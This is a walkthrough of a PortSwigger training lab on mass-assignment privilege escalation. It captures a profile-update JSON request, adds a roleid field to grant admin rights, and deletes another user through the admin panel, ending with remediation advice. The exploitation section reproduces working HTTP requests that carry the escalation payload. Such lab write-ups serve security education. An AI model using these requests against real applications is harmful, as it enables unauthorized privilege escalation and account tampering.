# Lab: User Role Can Be Modified in User Profile

| | |
|---|---|
| **Platform** | PortSwigger Web Security Academy |
| **Category** | Access Control Vulnerabilities |
| **Difficulty** | Apprentice |
| **Vulnerability** | Vertical privilege escalation: mass assignment / excessive trust in client-supplied JSON |
| **Objective** | Access the admin panel and delete the user `carlos` |
| **Tools used** | Firefox, Burp Suite (Proxy, Repeater) |
| **Credentials provided** | `wiener:peter` |

---

## 1. Challenge Description

The lab description states:

> This lab has an admin panel at `/admin`. It's only accessible to logged-in users with a `roleid` of 2.
>
> Solve the lab by accessing the admin panel and using it to delete the user `carlos`.
>
> You can log in to your own account using the following credentials: `wiener:peter`

<img width="1533" height="784" alt="image" src="https://github.com/user-attachments/assets/961953ce-f2ff-4035-ac38-3d4fd7644bf2" />

This description is a significant hint: it names the exact field (`roleid`) and the exact value (`2`) that the server checks before granting admin access.

---

## 2. Recon

The lab opens on a standard shop front-end ("We Like To Shop").

<img width="1532" height="784" alt="image" src="https://github.com/user-attachments/assets/a89d32f3-a459-4616-8445-b7869c754a1f" />

### Step 1: Log in and inspect the account page

I logged in with `wiener:peter` and landed on `/my-account?id=wiener`. The page showed my username and current email, with an **Update email** form.

<img width="1530" height="784" alt="image" src="https://github.com/user-attachments/assets/ae7b8edd-c7b1-41b2-8c35-a5d4f022320c" />

This "Update email" feature was the only user-controlled write operation visible on the page, so it was the natural place to probe for a way to influence other account fields.

---

## 3. Vulnerability Analysis

I submitted an email change through the form while Burp Suite was proxying the traffic, then inspected the request in **HTTP history**.

**Original request:**

```http
POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=jcxLcDU3TdGhEIgVOXNiBmrIKDIujF9h
Content-Type: text/plain;charset=UTF-8

{"email":"wiener@peter.com"}
```

**Response:**

```http
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8

{
  "username":"wiener",
  "email":"wiener@peter.com",
  "apikey":"0zktiGwBYpC4apUsueztzSWsBs2ZsRpP",
  "roleid":1
}
```

![Burp Repeater: original change-email request and response showing roleid:1](images/04-burp-original-request-roleid1.png)

The response body revealed the full user object the server maintains, including a field I never submitted: **`"roleid":1`**. This is the critical finding. The endpoint is an **update** operation that echoes back the complete record, which strongly suggests the server might accept and apply *any* field present in the submitted JSON, not just `email`, a classic **mass assignment** vulnerability.

The root cause: the server-side handler for `/my-account/change-email` does not validate which fields the client is allowed to set. It was written as a generic "merge submitted JSON into user record" style update (or similar), instead of explicitly accepting only `email`.

---

## 4. Exploitation

### Step 1: Add `roleid` to the request body

I sent the captured request to **Burp Repeater** and modified the JSON body to include the field disclosed in the response, set to the privileged value named in the lab description (`2`):

```http
POST /my-account/change-email HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=jcxLcDU3TdGhEIgVOXNiBmrIKDIujF9h
Content-Type: text/plain;charset=UTF-8

{
  "email":"wiener@peter.com",
  "roleid":2
}
```

### Step 2: Confirm the server accepted it

The response confirmed the server applied the change:

```http
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8

{
  "username":"wiener",
  "email":"wiener@peter.com",
  "apikey":"0zktiGwBYpC4apUsueztzSWsBs2ZsRpP",
  "roleid":2
}
```

![Burp Repeater: modified request with roleid:2 in the body and response confirming roleid:2](images/05-burp-modified-request-roleid2.png)

The `roleid` field flipped from `1` to `2` purely because I included it in the request. No separate authorization check validated whether I was allowed to set this field.

### Step 3: Access the admin panel

I navigated back to the application in the browser. An **Admin panel** link now appeared in the navigation bar, and `/admin` was accessible, listing both users with **Delete** links:

- `wiener`
- `carlos`

![Admin panel now accessible, with Admin panel link in the nav and a Delete link for carlos](images/06-admin-panel-accessible.png)

### Step 4: Delete the target user

I clicked **Delete** next to `carlos`. The application responded with **"User deleted successfully!"**, and the user list now showed only `wiener`.

### Step 5: Confirm

The lab banner changed to **Solved**, with the confirmation banner *"Congratulations, you solved the lab!"*

![Lab solved: carlos deleted, banner shows Solved](images/07-lab-solved.png)

---

## 5. Result

| Check | Status |
|---|---|
| Logged in as low-privilege user `wiener` (`roleid: 1`) | Confirmed |
| Extra field `roleid` discovered in `change-email` response | Done |
| `roleid` escalated to `2` via modified Repeater request | Done |
| `/admin` accessible after escalation | Confirmed |
| User `carlos` deleted | Done |
| Lab status | **Solved** |

---

## 6. Impact

Because the update endpoint blindly trusts whichever fields the client includes in the JSON body:

- Any authenticated user can grant themselves administrator privileges simply by adding a field the API happens to accept.
- The same class of bug could be used to tamper with other sensitive fields, such as account balance, subscription tier, or email-verification status, if those fields were similarly unprotected.
- This is a form of **mass assignment / over-posting vulnerability**, which falls under OWASP's Broken Access Control category, and is especially dangerous in APIs that serialize entire internal objects back to the client.

---

## 7. Remediation

1. **Use an explicit allow-list for updatable fields.** The `change-email` handler should only read and apply the `email` field from the request body, ignoring everything else.
2. **Never bind client-supplied JSON directly onto internal data models** (no blind deserialization into the full user object). Map incoming fields to a dedicated DTO that only exposes what that endpoint is meant to change.
3. **Re-check authorization server-side for privileged fields.** Changing a role, permission level or similar sensitive attribute should require a separate, properly authorized admin-only endpoint, never be reachable through a self-service profile update.
4. **Avoid echoing the full internal record back to the client** (including fields like `apikey` and `roleid`) unless the client specifically needs them; this also reduces information disclosure that helped identify the vulnerable field.
5. **Apply the principle of least privilege** and validate role/permission changes against the requester's own current privileges, not just accept what they type.

---

## 8. Key Takeaways

- Whenever an API response includes fields you never submitted, treat it as a hint: the server may process more input fields than its public form actually exposes. Try feeding those field names back in.
- **Mass assignment** vulnerabilities are common in JSON-based update endpoints. Always test whether extra properties "stick" when added to a request.
- The lab description sometimes hands you the exact field name and expected value (`roleid` of `2`) as part of the challenge. Read the description carefully, it often shortcuts the discovery phase.
- Burp Repeater is ideal for this kind of parameter/field injection testing: capture once, then iterate on the body quickly.

---

## 9. References

- [PortSwigger: Access control vulnerabilities](https://portswigger.net/web-security/access-control)
- [PortSwigger: User role can be modified in user profile](https://portswigger.net/web-security/access-control#user-role-can-be-modified-in-user-profile)
- [OWASP: Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
